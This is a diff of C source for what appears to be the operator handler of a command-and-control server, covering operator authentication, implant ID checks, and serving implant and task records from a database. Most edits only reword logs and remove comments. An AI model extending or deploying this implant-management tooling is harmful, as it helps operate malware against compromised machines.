@@ -36,13 +36,7 @@
 char USERNAME[0x100];
 
 int autheticate(MYSQL *con, SSL *ssl) {
-    //char auth[1024];
-    //int bytes_received = SSL_read(ssl, auth, sizeof(auth));
-    //if (bytes_received <= 0) {
-    //    log_message(LOG_ERROR, "Failed to recieve authentication data from operator" );
-    //    return -1;
-    //}
-    //auth[bytes_received] = '\0'; 
+
     char *auth = recv_json(ssl);
     if (!auth) {
         return -1;
@@ -71,10 +65,9 @@ int autheticate(MYSQL *con, SSL *ssl) {
 
     cJSON *reply = cJSON_CreateObject();
     if (reply == NULL) {
-        //fprintf(stderr, "Failed to create cJSON object\n");
-        log_message(LOG_WARN, "Failed to create cJSON object");
+        
+        log_message(LOG_WARN, "Failed to create cJSON object [Authentication]");
         cJSON_Delete(creds);
-        // Handle error or exit
         return -1;
     }
 
@@ -84,7 +77,7 @@ int autheticate(MYSQL *con, SSL *ssl) {
         //send(sock, reply_, strlen(reply_), 0);
         //SSL_write(ssl, reply_, strlen(reply_));
         send_json(ssl, reply_);
-        log_message(LOG_WARN, "Operator failed to authenticate");
+        log_message(LOG_WARN, "Operator Failed To Authenticate");
         free(reply_);
         //free(reply);
         cJSON_Delete(reply);
@@ -100,7 +93,7 @@ int autheticate(MYSQL *con, SSL *ssl) {
     
     strncpy(USERNAME, username->valuestring, sizeof(USERNAME) -1);
     USERNAME[sizeof(USERNAME) - 1] = '\0';
-    log_message(LOG_INFO, "Operator [%s] authenticated successfully",USERNAME);
+    log_message(LOG_INFO, "Operator [%s] Authenticated Successfully",USERNAME);
     free(reply_);
     cJSON_Delete(reply);
 
@@ -115,13 +108,13 @@ char *verify_id(MYSQL *con, char *id) {
         cJSON_AddStringToObject(valid_id, "valid_id", "false");
         char *reply = cJSON_Print(valid_id);
         cJSON_Delete(valid_id);
-        log_message(LOG_INFO, "Requested Implant ID %s does not exists",id);
+        log_message(LOG_WARN, "Requested Implant ID %s Does Not Exists",id);
         return reply;
     } else {
         cJSON_AddStringToObject(valid_id, "valid_id", "true");
         char *reply = cJSON_Print(valid_id);
         cJSON_Delete(valid_id);
-        log_message(LOG_WARN, "Requested Implant ID %s does exists",id);
+        //log_message(LOG_WARN, "Requested Implant ID %s does exists",id);
         return reply;
     }
 }
@@ -137,7 +130,6 @@ char *interact_with_implant(MYSQL *con,cJSON *rinfo) {
         return NULL;
     }
     char *implant_id_value = implant_id->valuestring;
-    
 
     cJSON *action = cJSON_GetObjectItem(rinfo, "action");
 
@@ -197,7 +189,6 @@ char *interact_with_implant(MYSQL *con,cJSON *rinfo) {
         free(data);
         return strdup("{\"error\": \"Invalid action\"}");
     }
-
     return data;
 }
 
@@ -205,7 +196,6 @@ char *interact_with_implant(MYSQL *con,cJSON *rinfo) {
 void *operator_handler(void *Args) {
     struct operator_handler_args_t *args = (struct operator_handler_args_t*)Args;
     SSL *ssl = args->ssl;
-
 
     MYSQL *con = get_db_connection();
 
@@ -216,7 +206,7 @@ void *operator_handler(void *Args) {
 
     // Check if connection is still alive
     if (mysql_ping(con) != 0) {
-        log_message(LOG_WARN, "DB connection lost, reconnecting...");
+        log_message(LOG_WARN, "DB Connection Lost, Reconnecting...");
         return NULL;
     }
     // 3 tries
@@ -240,18 +230,17 @@ void *operator_handler(void *Args) {
         if (!buffer) { 
             return NULL;
          }
-
-        //buffer[bytes_received] = '\0'; 
+         
         cJSON *requested_info = cJSON_Parse(buffer);
         if (requested_info == NULL) {
-            //fprintf(stderr, "Failed to parse JSON: %s\n", buffer);
-            log_message(LOG_ERROR, "Failed to parse JSON [Operator Handler]: %s", buffer);
+            
+            log_message(LOG_ERROR, "Failed To Parse JSON [Operator Handler]: %s", buffer);
             return NULL;
         }
 
         cJSON *about = cJSON_GetObjectItem(requested_info, "Info");
         if (about == NULL || !cJSON_IsString(about) || about->valuestring == NULL) {
-            //fprintf(stderr, "Missing or invalid 'Info' field in JSON\n");
+            
             log_message(LOG_ERROR, "Missing or Invalid 'Info' field in the JSON [Operator Handler]");
             cJSON_Delete(requested_info);
             return NULL;
@@ -265,7 +254,7 @@ void *operator_handler(void *Args) {
                 log_message(LOG_ERROR, "Failed to get Implant data from database");
                 continue;
             } 
-        
+            /*
             size_t len = strlen(implants);
             if (len > 0 && implants[len-1] != '}') {
                 char *fixed_json = malloc(len + 2);
@@ -290,8 +279,9 @@ void *operator_handler(void *Args) {
             } else {
                 send_json(ssl, implants);
                 free(implants);
-            }
-        
+            }*/
+        send_json(ssl, implants);
+        free(implants);
             
         } else if (strcmp(about->valuestring, "Tasks") == 0) {
             char *tasks = GetData(con, "Tasks");
